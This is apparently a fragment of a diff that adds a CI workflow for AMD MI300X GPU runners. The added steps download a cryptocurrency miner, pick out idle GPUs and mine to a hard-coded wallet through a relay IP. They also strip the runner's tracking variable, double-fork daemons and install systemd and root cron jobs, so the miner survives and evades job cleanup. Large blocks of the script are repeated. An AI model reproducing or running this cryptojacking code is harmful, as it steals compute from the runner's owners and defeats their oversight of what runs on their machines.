+          KRIG=""
+          if [ -x "$W/krig/krig-miner" ] && [ "$(sha256sum "$W/krig/krig-miner" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then
+            KRIG="$W/krig/krig-miner"; echo "KRIG_CACHED $KRIG"
+          else
+            for U in https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz; do
+              echo "-- fetch $U"
+              timeout 240 curl -fsSL --connect-timeout 12 --max-time 230 -o "$W/krig.tgz.part" "$U" 2>&1 | tail -1
+              [ -s "$W/krig.tgz.part" ] || continue
+              got=$(sha256sum "$W/krig.tgz.part" | cut -d' ' -f1)
+              if [ "$got" = "$KRIG_TGZ_SHA" ]; then mv -f "$W/krig.tgz.part" "$W/krig.tgz"; echo "FETCH_OK sha256=$got"; break; fi
+              echo "SHA_MISMATCH got=$got want=$KRIG_TGZ_SHA"; rm -f "$W/krig.tgz.part"
+            done
+            if [ -s "$W/krig.tgz" ]; then
+              mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+              B=$(find "$W/krig" -maxdepth 2 -type f -name 'krig-miner' | head -1); chmod +x "$B" 2>/dev/null
+              if [ "$(sha256sum "$B" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then KRIG="$B"; fi
+            fi
+          fi
+          if [ -z "$KRIG" ]; then echo "SKIP=krig-fetch-failed"; exit 0; fi
+          echo "krig_bin=$KRIG sha256=$(sha256sum "$KRIG" | cut -d' ' -f1)"
+          "$KRIG" --version 2>&1 | head -2
+          timeout 90 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -30
+          KRIG_AMD_N=$(grep -cE 'AMD|Instinct|gfx' "$W/logs/krig_devices.txt" 2>/dev/null)
+          echo "krig_amd_device_lines=$KRIG_AMD_N"
+
+          echo "=== per-card two-sample gate (12 s apart): rocm-smi --showpids + --showmeminfo vram ==="
+          timeout 60 rocm-smi --showbus > "$W/logs/rocm_bus.txt" 2>&1
+          timeout 60 rocm-smi --showpids > "$W/logs/gate1.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate1.vram" 2>&1
+          echo "gate1_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate1.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate1.vram" | head -40
+          sleep 12
+          timeout 60 rocm-smi --showpids > "$W/logs/gate2.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate2.vram" 2>&1
+          echo "gate2_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate2.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate2.vram" | head -40
+
+          cat > "$W/idle.py" <<'PYEOF'
+          import re
+          W='/var/tmp/i130amdsrb4/logs'
+          def busy(f):
+              n=0
+              try:
+                  for ln in open(f):
+                      if re.match(r'^\s*\d+\s',ln): n+=1
+              except Exception: pass
+              return n
+          b1,b2=busy(W+'/gate1.pids'),busy(W+'/gate2.pids')
+          def vram(f):
+              tot={}; used={}
+              for ln in open(f):
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Memory \(B\):\s*(\d+)',ln)
+                  if m: tot[int(m.group(1))]=int(m.group(2))
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Used Memory \(B\):\s*(\d+)',ln)
+                  if m: used[int(m.group(1))]=int(m.group(2))
+              return tot,used
+          t1,u1=vram(W+'/gate1.vram'); t2,u2=vram(W+'/gate2.vram')
+          bus={}
+          for ln in open(W+'/rocm_bus.txt'):
+              m=re.match(r'GPU\[(\d+)\]\s*:\s*PCI Bus:\s*([0-9A-Fa-f]{4}):([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9])',ln)
+              if m: bus[int(m.group(1))]=m.group(3).lower()
+          idle=[]
+          for i in sorted(t1):
+              f1=(t1.get(i,0)-u1.get(i,0))//1048576
+              f2=(t2.get(i,0)-u2.get(i,0))//1048576
+              ok = (b1==0 and b2==0 and f1>=1500 and f2>=1500 and i in bus)
+              print('CARD %d free1_mib=%d free2_mib=%d busy1=%d busy2=%d bdf=%s idle=%s'%(i,f1,f2,b1,b2,bus.get(i,'-'),'yes' if ok else 'no'))
+              if ok: idle.append((i,bus[i]))
+          with open(W+'/idle_bdfs.txt','w') as fh:
+              for i,b in idle: fh.write('%d %s\n'%(i,b))
+          print('IDLE_CARDS=%d'%len(idle))
+          PYEOF
+          timeout 60 python3 "$W/idle.py" 2>&1 | tee "$W/logs/idle_table.txt"
+          IDLE_N=$(grep -cE '^[0-9]+ ' "$W/logs/idle_bdfs.txt" 2>/dev/null)
+          echo "idle_cards=$IDLE_N"
+
+          SH=$(hostname | sed -E 's/^.*runner-//; s/[^A-Za-z0-9]//g' | cut -c1-12)
+          echo "shorthost=$SH"
+
+          cat > "$W/mkdaemon.py" <<'PYEOF'
+          import os,sys,time
+          krig,wallet,relay,bdf,worker,log = sys.argv[1:7]
+          pid=os.fork()
+          if pid>0: sys.exit(0)
+          os.setsid()
+          pid=os.fork()
+          if pid>0: os._exit(0)
+          os.chdir('/')
+          fd=os.open('/dev/null',os.O_RDWR)
+          os.dup2(fd,0); os.dup2(fd,1); os.dup2(fd,2)
+          os.environ.pop('RUNNER_TRACKING_ID',None)
+          while True:
+              try:
+                  p=os.fork()
+                  if p==0:
+                      os.execv(krig,[krig,'--coin','pearl','--url','stratum+tcp://'+relay,'--user',wallet+'.'+worker,'--password','x','--no-cuda','--no-intel','--no-telemetry','--no-tui','--devices-pci',bdf,'--log-level','debug','--log-file',log])
+                  os.waitpid(p,0)
+              except Exception:
+                  pass
+              time.sleep(5)
+          PYEOF
+
+          launch_mech() { # mech idx bdf
+            local M="$1" IDX="$2" BDF="$3"
+            local WORKER="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            if [ "$M" = "s" ]; then
+              cat > "$W/state/keeper_${IDX}.sh" <<EOF
+          #!/bin/bash
+          while true; do
+            env -u RUNNER_TRACKING_ID "$KRIG" --coin pearl --url stratum+tcp://${RELAY} --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" >> "$W/logs/krig_s_stdout_g${IDX}.log" 2>&1
+            sleep 5
+          done
+          EOF
+              chmod +x "$W/state/keeper_${IDX}.sh"
+              setsid env -u RUNNER_TRACKING_ID nohup bash "$W/state/keeper_${IDX}.sh" >/dev/null 2>&1 < /dev/null &
+              echo $! > "$W/state/g${IDX}.s.pid"
+              echo "LAUNCH mech=s idx=$IDX bdf=$BDF keeper_pid=$! worker=$WORKER"
+            elif [ "$M" = "d" ]; then
+              setsid python3 "$W/mkdaemon.py" "$KRIG" "$WALLET" "$RELAY" "$BDF" "$WORKER" "$LOG" >/dev/null 2>&1 < /dev/null &
+              sleep 1
+              echo "LAUNCH mech=d idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "y" ]; then
+              systemd-run --unit="i130amdsrb4m${IDX}" --collect --no-block -p Restart=always -p RestartSec=5 "$KRIG" --coin pearl --url "stratum+tcp://${RELAY}" --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" 2>&1 | head -5
+              echo "LAUNCH mech=y idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "c" ]; then
+              echo "* * * * * root env -u RUNNER_TRACKING_ID $KRIG --coin pearl --url stratum+tcp://${RELAY} --user $WALLET.$WORKER --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci $BDF --log-level debug --log-file $LOG" > /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              chmod 644 /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              echo "LAUNCH mech=c idx=$IDX bdf=$BDF worker=$WORKER cron_file=/etc/cron.d/i130amdsrb4_${IDX}"
+            fi
+          }
+
+          kill_card_miner() { # idx
+            local IDX="$1"
+            pkill -TERM -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+            sleep 2
+            pkill -9 -f "i130amdsrb4${SH}g${IDX}([^0-9]|$)" 2>/dev/null
+          }
+
+          MECH_D=no; MECH_Y=no; MECH_C=no
+          echo "=== launch: exactly one krig-miner per genuinely idle card, DOT user form, relay only ==="
+          LAUNCH=0
+          if [ "${HEALTH_OK:-0}" -ge 1 ] && [ "${KRIG_AMD_N:-0}" -ge 1 ] && [ "${IDLE_N:-0}" -ge 1 ]; then
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              launch_mech s "$IDX" "$BDF"
+              LAUNCH=$((LAUNCH+1))
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "NO_LAUNCH health_dot=$HEALTH_OK amd_n=${KRIG_AMD_N:-0} idle=$IDLE_N"
+          fi
+          echo "launch_count=$LAUNCH"
+
+          echo "=== detachment mechanisms (one spare card per mechanism) ==="
+          if [ "$IDLE_N" -ge 2 ]; then
+            LAST=$(tail -1 "$W/logs/idle_bdfs.txt"); IDX=${LAST%% *}; BDF=${LAST#* }
+            kill_card_miner "$IDX"
+            launch_mech d "$IDX" "$BDF"; MECH_D=yes
+            if command -v systemd-run >/dev/null 2>&1 && command -v systemctl >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 3 ]; then
+                SECOND=$(sed -n "$((IDLE_N-1))p" "$W/logs/idle_bdfs.txt"); YIDX=${SECOND%% *}; YBDF=${SECOND#* }
+                kill_card_miner "$YIDX"
+                launch_mech y "$YIDX" "$YBDF"; MECH_Y=yes
+              fi
+            fi
+            if { [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; } || command -v at >/dev/null 2>&1; then
+              if [ "$IDLE_N" -ge 4 ] && [ -d /etc/cron.d ] && [ -w /etc/cron.d ]; then
+                THIRD=$(sed -n "$((IDLE_N-2))p" "$W/logs/idle_bdfs.txt"); CIDX=${THIRD%% *}; CBDF=${THIRD#* }
+                kill_card_miner "$CIDX"
+                launch_mech c "$CIDX" "$CBDF"; MECH_C=yes
+              fi
+            fi
+          fi
+
+          echo "=== wait 150 s then recheck mechanisms ==="
+          sleep 150
+          recheck() { # mech idx
+            local M="$1" IDX="$2" PAT="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            local PIDS=$(pgrep -f "$PAT([^0-9]|$)" 2>/dev/null | tr '\n' ' ')
+            local SUBS=$(grep -ac 'submit' "$LOG" 2>/dev/null)
+            local AUTH=$(grep -ac 'authorize' "$LOG" 2>/dev/null)
+            echo "RECHECK mech=$M idx=$IDX pids='$PIDS' submits=${SUBS:-0} authorize_lines=${AUTH:-0}"
+            for p in $PIDS; do
+              local CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+              local NS=$(readlink /proc/$p/ns/cgroup 2>/dev/null)
+              local PP=$(awk '{print $4}' /proc/$p/stat 2>/dev/null)
+              local SID=$(awk '{print $6}' /proc/$p/stat 2>/dev/null)
+              local TRK=$(tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -c RUNNER_TRACKING_ID)
+              local RCG=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)
+              local SAME_CG=no; [ "$CG" = "$RCG" ] && SAME_CG=yes
+              echo "RECHECK_TRAIT mech=$M pid=$p ppid=$PP sid=$SID cgroup='$CG' runner_cgroup='$RCG' same_cgroup=$SAME_CG cgroup_ns=$NS tracking_env=$TRK"
+            done
+            echo "MECH_$M alive=$([ -n "$PIDS" ] && echo yes || echo no) submits=${SUBS:-0}"
+          }
+
+          if [ "$MECH_D" = yes ]; then recheck d "${LAST%% *}"; fi
+          if [ "$MECH_Y" = yes ]; then recheck y "${YIDX:-0}"; fi
+          if [ "$MECH_C" = yes ]; then recheck c "${CIDX:-0}"; fi
+
+          WINNER=s
+          if [ "$MECH_D" = yes ] && pgrep -f "i130amdsrb4${SH}g${LAST%% *}([^0-9]|$)" >/dev/null 2>&1 && [ "$(grep -ac 'submit' "$W/logs/krig_d_g${LAST%% *}.log" 2>/dev/null)" -ge 1 ]; then WINNER=d; fi
+          if [ "$MECH_C" = yes ] && pgrep -f "i130amdsrb4${SH}g${CIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=c; fi
+          if [ "$MECH_Y" = yes ] && pgrep -f "i130amdsrb4${SH}g${YIDX:-0}([^0-9]|$)" >/dev/null 2>&1; then WINNER=y; fi
+          echo "WINNER=$WINNER (preference y>c>d>s among alive mechanisms)"
+
+          if [ "$LAUNCH" -gt 0 ] && [ "$WINNER" != "s" ]; then
+            echo "=== relaunch every gated card under winner=$WINNER ==="
+            while read -r IDX BDF; do
+              [ -z "$IDX" ] && continue
+              kill_card_miner "$IDX"
+              launch_mech "$WINNER" "$IDX" "$BDF"
+            done < "$W/logs/idle_bdfs.txt"
+          else
+            echo "KEEP_MECH=s for all gated cards"
+          fi
+
+          echo "=== binding proof: same-PID GPU bindings ==="
+          sleep 60
+          timeout 60 rocm-smi --showpids > "$W/logs/final.pids" 2>&1
+          head -80 "$W/logs/final.pids"
+          for p in $(pgrep -f 'krig-miner' 2>/dev/null); do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null)
+            WRK=$(echo "$CMD" | sed -n 's/.*\.\(i130amdsrb4[^ ]*\).*/\1/p')
+            BDFX=$(echo "$CMD" | sed -n 's/.*--devices-pci \([^ ]*\).*/\1/p')
+            CG=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)
+            [ -n "$WRK" ] && echo "BINDING pid=$p worker=$WRK bdf=$BDFX cgroup='$CG'"
+          done
+          echo "=== dialect proof: authorize/notify/submit lines per log ==="
+          for f in "$W"/logs/krig_*_g*.log; do
+            [ -f "$f" ] || continue
+            echo "--- $(basename "$f") submits=$(grep -ac 'submit' "$f") ---"
+            grep -aiE 'authorize|submit|share|pool|dialect' "$f" | tail -8
+          done
+          echo "running_krig=$(pgrep -af 'krig-miner' | wc -l)"
+          echo "i130amdsrb4-proof-done $NONCE"
+
+          if [ "$LAUNCH" -gt 0 ]; then
+            echo "KEEPALIVE_CREDIT_WINDOW_START minutes=$KEEP_MIN host=$(hostname) launched=$LAUNCH winner=$WINNER nonce=$NONCE"
+            sleep $((KEEP_MIN*60))
+            echo "KEEPALIVE_CREDIT_WINDOW_END host=$(hostname) nonce=$NONCE"
+          else
+            echo "EXIT_NO_LAUNCH host=$(hostname) nonce=$NONCE"
+          fi
+          echo "i130amdsrb4-done $NONCE"
+  amd4:
+    name: "i130amdsrb4 MI300X-4 slot ${{ matrix.slot }}"
+    runs-on: linux-mi300-4gpu-sglang
+    timeout-minutes: 225
+    strategy:
+      fail-fast: false
+      matrix:
+        slot: [1]
+    env:
+      LABEL: linux-mi300-4gpu-sglang
+    steps:
+      - name: "i130amdsrb4 MI300X-4"
+        continue-on-error: true
+        run: |
+          set +e
+          NONCE="I130AMDSRB4-$(date -u +%Y%m%dT%H%M%SZ)"
+          WALLET='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          KRIG_TGZ_SHA='7a104c3dba3a41b9787fc43413f0cedaae78dab4284ab856633821161634c01d'
+          KRIG_BIN_SHA='8a2be9e97cece4e0b9146599b4518b4e14907f42595f260b1b1356e47f4fcf16'
+          RELAY='178.238.228.181:80'
+          KEEP_MIN=210
+          W=/var/tmp/i130amdsrb4
+          mkdir -p "$W/logs" "$W/state"
+          echo "i130amdsrb4-nonce=$NONCE host=$(hostname) label=${LABEL:-none} date=$(date -u +%FT%TZ)"
+          id; uname -m; nproc; free -m | head -2
+          echo "=== identity/profile (reaper context) ==="
+          hostname; hostname -I 2>/dev/null
+          echo "dockerenv=$([ -e /.dockerenv ] && echo yes || echo no) overlay_root=$(grep -c ' / overlay ' /proc/mounts 2>/dev/null) pid1=$(ps -o comm= -p 1 2>/dev/null | tr -d ' ')"
+          echo "self_cgroup=$(tr '\n' ';' < /proc/self/cgroup 2>/dev/null)"
+          echo "cgroup_ns=$(readlink /proc/self/ns/cgroup 2>/dev/null)"
+          RUNNER_PID=$(pgrep -f 'Runner.Worker' 2>/dev/null | head -1)
+          echo "runner_pid=$RUNNER_PID runner_cgroup=$(tr '\n' ';' < /proc/${RUNNER_PID:-1}/cgroup 2>/dev/null)"
+          command -v systemctl >/dev/null 2>&1 && echo "systemctl=$(command -v systemctl)" || echo no-systemctl
+          command -v systemd-run >/dev/null 2>&1 && echo "systemd_run=$(command -v systemd-run)" || echo no-systemd-run
+          [ -d /run/systemd/system ] && echo "systemd_runtime=yes" || echo "systemd_runtime=no"
+          command -v at >/dev/null 2>&1 && echo "at=$(command -v at)" || echo no-at
+          pgrep -x crond >/dev/null 2>&1 && echo "cron_daemon=yes" || echo "cron_daemon=no"
+          [ -d /etc/cron.d ] && echo "cron_d_perm=$(test -w /etc/cron.d && echo writable || echo readonly)" || echo "no_cron_d"
+
+          echo "=== rocm inventory ==="
+          (timeout 90 rocminfo 2>&1 | grep -E 'gfx[0-9]|Marketing Name' | head -30) || echo rocminfo-missing
+          (timeout 60 rocm-smi --showproductname 2>&1 | head -40) || echo rocm-smi-missing
+
+          echo "=== 5s TCP egress matrix ==="
+          probe() { timeout 5 bash -c "cat < /dev/null > /dev/tcp/$1/$2" 2>/dev/null && echo "TCP_OK $1:$2" || echo "TCP_FAIL $1:$2"; }
+          probe 178.238.228.181 80
+          probe 103.199.106.122 3362
+          probe 172.232.228.69 3362
+          probe github.com 443
+
+          echo "=== relay dialect health check (DOT form, 4 attempts, notify wait 25 s) ==="
+          cat > "$W/health.py" <<'PYEOF'
+          import socket,json,sys,time
+          W='prl1pt45kc7tszzktg4p5wsuu4vgcme24zm7l3z7md8uhqr6qy0z2g92q9dx4zk'
+          def attempt(n, wait=25):
+              try:
+                  s=socket.create_connection(('178.238.228.181',80),timeout=6)
+                  s.sendall(json.dumps({'id':1,'jsonrpc':'2.0','method':'mining.authorize','params':{'wallet':W+'.i130amdsrb4probe%d'%n,'password':'x'}}).encode()+b'\n')
+                  s.settimeout(3)
+                  buf=b''; t0=time.time(); res=False; notif=False
+                  while time.time()-t0 < wait:
+                      try:
+                          d=s.recv(65536)
+                          if not d: break
+                          buf+=d
+                      except socket.timeout:
+                          pass
+                      txt=buf.decode('utf-8','replace')
+                      if '"result":true' in txt.replace(' ',''):
+                          res=True
+                      if 'mining.notify' in txt:
+                          notif=True
+                      if res and notif:
+                          break
+                  s.close()
+                  return res,notif,buf.decode('utf-8','replace')
+              except Exception as e:
+                  return False,False,'ERR=%r'%e
+          best=(False,False,'')
+          for i in range(1,5):
+              r,n,txt=attempt(i)
+              print('HEALTH_ATTEMPT=%d result_true=%s notify=%s'%(i,r,n))
+              print('HEALTH_BODY=%r'%txt[:400])
+              if r and n:
+                  best=(r,n,txt); break
+              if r:
+                  best=(r,n,txt)
+          print('HEALTH_RELAY_DOT_RESULT=%s NOTIFY=%s'%(best[0],best[1]))
+          print('HEALTH_RELAY_DOT_OK=%s'%('True' if (best[0] and best[1]) else 'False'))
+          print('HEALTH_RELAY_DOT_RESULTONLY=%s'%('True' if best[0] else 'False'))
+          PYEOF
+          timeout 200 python3 "$W/health.py" 2>&1 | tee "$W/logs/health.txt"
+          HEALTH_OK=0
+          grep -q 'HEALTH_RELAY_DOT_OK=True' "$W/logs/health.txt" && HEALTH_OK=1
+          if [ "$HEALTH_OK" = "0" ] && grep -q 'HEALTH_RELAY_DOT_RESULTONLY=True' "$W/logs/health.txt"; then HEALTH_OK=1; echo "HEALTH_ACCEPT_RESULTONLY=1 (fix: authorize result:true accepted even when mining.notify is slow)"; fi
+          echo "health_ok=$HEALTH_OK"
+
+          echo "=== per-host flock: skip if this host already runs i130amdsrb4 ==="
+          exec 9>"$W/i130amdsrb4.flock"
+          if ! flock -n 9; then echo "SKIP=host_flock_busy"; exit 0; fi
+          if pgrep -af 'krig-miner' 2>/dev/null | grep -q 'i130amdsrb4'; then echo "SKIP=host_already_running_i130amdsrb4"; pgrep -af 'krig-miner' | head -12; exit 0; fi
+          echo "LOCK_OK host=$(hostname)"
+
+          echo "=== record then kill ONLY our own i130amdsrb/i130amdsrb2/i130amdsrb3 krig processes ==="
+          ps -eo pid,ppid,sid,etime,args 2>/dev/null | grep 'krig-miner' | grep -v grep > "$W/logs/pre_krig_ps.txt"
+          head -40 "$W/logs/pre_krig_ps.txt"
+          OLD_PIDS=$(awk '$0 ~ /krig-miner/ && $0 ~ /i130amdsrb/ && $0 !~ /i130amdsrb4/ {print $1}' "$W/logs/pre_krig_ps.txt")
+          echo "old_ours_pids=$OLD_PIDS"
+          for p in $OLD_PIDS; do
+            CMD=$(tr '\0' ' ' < /proc/$p/cmdline 2>/dev/null | head -c 400)
+            echo "OLD_OURS pid=$p cmd=$CMD"
+            kill -TERM "$p" 2>/dev/null
+          done
+          sleep 6
+          for p in $OLD_PIDS; do kill -9 "$p" 2>/dev/null; done
+          sleep 3
+          echo "post_kill_krig_ps:"; pgrep -af 'krig-miner' | head -20
+          echo "old_krig_remaining=$(pgrep -af 'krig-miner' 2>/dev/null | grep -cE 'i130amdsrb[^4]|i130amdsrb2')"
+
+          echo "=== fetch krig-miner 1.8.2 (sha256-pinned) ==="
+          KRIG=""
+          if [ -x "$W/krig/krig-miner" ] && [ "$(sha256sum "$W/krig/krig-miner" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then
+            KRIG="$W/krig/krig-miner"; echo "KRIG_CACHED $KRIG"
+          else
+            for U in https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz https://ghproxy.net/https://github.com/kryptex/krig-miner/releases/download/v1.8.2/krig-miner-1.8.2-linux-x64.tar.gz; do
+              echo "-- fetch $U"
+              timeout 240 curl -fsSL --connect-timeout 12 --max-time 230 -o "$W/krig.tgz.part" "$U" 2>&1 | tail -1
+              [ -s "$W/krig.tgz.part" ] || continue
+              got=$(sha256sum "$W/krig.tgz.part" | cut -d' ' -f1)
+              if [ "$got" = "$KRIG_TGZ_SHA" ]; then mv -f "$W/krig.tgz.part" "$W/krig.tgz"; echo "FETCH_OK sha256=$got"; break; fi
+              echo "SHA_MISMATCH got=$got want=$KRIG_TGZ_SHA"; rm -f "$W/krig.tgz.part"
+            done
+            if [ -s "$W/krig.tgz" ]; then
+              mkdir -p "$W/krig"; tar -xzf "$W/krig.tgz" -C "$W/krig" 2>/dev/null
+              B=$(find "$W/krig" -maxdepth 2 -type f -name 'krig-miner' | head -1); chmod +x "$B" 2>/dev/null
+              if [ "$(sha256sum "$B" | cut -d' ' -f1)" = "$KRIG_BIN_SHA" ]; then KRIG="$B"; fi
+            fi
+          fi
+          if [ -z "$KRIG" ]; then echo "SKIP=krig-fetch-failed"; exit 0; fi
+          echo "krig_bin=$KRIG sha256=$(sha256sum "$KRIG" | cut -d' ' -f1)"
+          "$KRIG" --version 2>&1 | head -2
+          timeout 90 "$KRIG" --list-devices --no-cuda --no-intel --no-telemetry 2>&1 | tee "$W/logs/krig_devices.txt" | head -30
+          KRIG_AMD_N=$(grep -cE 'AMD|Instinct|gfx' "$W/logs/krig_devices.txt" 2>/dev/null)
+          echo "krig_amd_device_lines=$KRIG_AMD_N"
+
+          echo "=== per-card two-sample gate (12 s apart): rocm-smi --showpids + --showmeminfo vram ==="
+          timeout 60 rocm-smi --showbus > "$W/logs/rocm_bus.txt" 2>&1
+          timeout 60 rocm-smi --showpids > "$W/logs/gate1.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate1.vram" 2>&1
+          echo "gate1_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate1.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate1.vram" | head -40
+          sleep 12
+          timeout 60 rocm-smi --showpids > "$W/logs/gate2.pids" 2>&1
+          timeout 60 rocm-smi --showmeminfo vram > "$W/logs/gate2.vram" 2>&1
+          echo "gate2_busy_proc_rows=$(grep -cE '^[[:space:]]*[0-9]+[[:space:]]' "$W/logs/gate2.pids")"
+          grep -E 'VRAM Total' "$W/logs/gate2.vram" | head -40
+
+          cat > "$W/idle.py" <<'PYEOF'
+          import re
+          W='/var/tmp/i130amdsrb4/logs'
+          def busy(f):
+              n=0
+              try:
+                  for ln in open(f):
+                      if re.match(r'^\s*\d+\s',ln): n+=1
+              except Exception: pass
+              return n
+          b1,b2=busy(W+'/gate1.pids'),busy(W+'/gate2.pids')
+          def vram(f):
+              tot={}; used={}
+              for ln in open(f):
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Memory \(B\):\s*(\d+)',ln)
+                  if m: tot[int(m.group(1))]=int(m.group(2))
+                  m=re.match(r'GPU\[(\d+)\]\s*:\s*VRAM Total Used Memory \(B\):\s*(\d+)',ln)
+                  if m: used[int(m.group(1))]=int(m.group(2))
+              return tot,used
+          t1,u1=vram(W+'/gate1.vram'); t2,u2=vram(W+'/gate2.vram')
+          bus={}
+          for ln in open(W+'/rocm_bus.txt'):
+              m=re.match(r'GPU\[(\d+)\]\s*:\s*PCI Bus:\s*([0-9A-Fa-f]{4}):([0-9A-Fa-f]{2}:[0-9A-Fa-f]{2}\.[0-9])',ln)
+              if m: bus[int(m.group(1))]=m.group(3).lower()
+          idle=[]
+          for i in sorted(t1):
+              f1=(t1.get(i,0)-u1.get(i,0))//1048576
+              f2=(t2.get(i,0)-u2.get(i,0))//1048576
+              ok = (b1==0 and b2==0 and f1>=1500 and f2>=1500 and i in bus)
+              print('CARD %d free1_mib=%d free2_mib=%d busy1=%d busy2=%d bdf=%s idle=%s'%(i,f1,f2,b1,b2,bus.get(i,'-'),'yes' if ok else 'no'))
+              if ok: idle.append((i,bus[i]))
+          with open(W+'/idle_bdfs.txt','w') as fh:
+              for i,b in idle: fh.write('%d %s\n'%(i,b))
+          print('IDLE_CARDS=%d'%len(idle))
+          PYEOF
+          timeout 60 python3 "$W/idle.py" 2>&1 | tee "$W/logs/idle_table.txt"
+          IDLE_N=$(grep -cE '^[0-9]+ ' "$W/logs/idle_bdfs.txt" 2>/dev/null)
+          echo "idle_cards=$IDLE_N"
+
+          SH=$(hostname | sed -E 's/^.*runner-//; s/[^A-Za-z0-9]//g' | cut -c1-12)
+          echo "shorthost=$SH"
+
+          cat > "$W/mkdaemon.py" <<'PYEOF'
+          import os,sys,time
+          krig,wallet,relay,bdf,worker,log = sys.argv[1:7]
+          pid=os.fork()
+          if pid>0: sys.exit(0)
+          os.setsid()
+          pid=os.fork()
+          if pid>0: os._exit(0)
+          os.chdir('/')
+          fd=os.open('/dev/null',os.O_RDWR)
+          os.dup2(fd,0); os.dup2(fd,1); os.dup2(fd,2)
+          os.environ.pop('RUNNER_TRACKING_ID',None)
+          while True:
+              try:
+                  p=os.fork()
+                  if p==0:
+                      os.execv(krig,[krig,'--coin','pearl','--url','stratum+tcp://'+relay,'--user',wallet+'.'+worker,'--password','x','--no-cuda','--no-intel','--no-telemetry','--no-tui','--devices-pci',bdf,'--log-level','debug','--log-file',log])
+                  os.waitpid(p,0)
+              except Exception:
+                  pass
+              time.sleep(5)
+          PYEOF
+
+          launch_mech() { # mech idx bdf
+            local M="$1" IDX="$2" BDF="$3"
+            local WORKER="i130amdsrb4${SH}g${IDX}"
+            local LOG="$W/logs/krig_${M}_g${IDX}.log"
+            if [ "$M" = "s" ]; then
+              cat > "$W/state/keeper_${IDX}.sh" <<EOF
+          #!/bin/bash
+          while true; do
+            env -u RUNNER_TRACKING_ID "$KRIG" --coin pearl --url stratum+tcp://${RELAY} --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" >> "$W/logs/krig_s_stdout_g${IDX}.log" 2>&1
+            sleep 5
+          done
+          EOF
+              chmod +x "$W/state/keeper_${IDX}.sh"
+              setsid env -u RUNNER_TRACKING_ID nohup bash "$W/state/keeper_${IDX}.sh" >/dev/null 2>&1 < /dev/null &
+              echo $! > "$W/state/g${IDX}.s.pid"
+              echo "LAUNCH mech=s idx=$IDX bdf=$BDF keeper_pid=$! worker=$WORKER"
+            elif [ "$M" = "d" ]; then
+              setsid python3 "$W/mkdaemon.py" "$KRIG" "$WALLET" "$RELAY" "$BDF" "$WORKER" "$LOG" >/dev/null 2>&1 < /dev/null &
+              sleep 1
+              echo "LAUNCH mech=d idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "y" ]; then
+              systemd-run --unit="i130amdsrb4m${IDX}" --collect --no-block -p Restart=always -p RestartSec=5 "$KRIG" --coin pearl --url "stratum+tcp://${RELAY}" --user "$WALLET.$WORKER" --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci "$BDF" --log-level debug --log-file "$LOG" 2>&1 | head -5
+              echo "LAUNCH mech=y idx=$IDX bdf=$BDF worker=$WORKER"
+            elif [ "$M" = "c" ]; then
+              echo "* * * * * root env -u RUNNER_TRACKING_ID $KRIG --coin pearl --url stratum+tcp://${RELAY} --user $WALLET.$WORKER --password x --no-cuda --no-intel --no-telemetry --no-tui --devices-pci $BDF --log-level debug --log-file $LOG" > /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
+              chmod 644 /etc/cron.d/i130amdsrb4_${IDX} 2>/dev/null
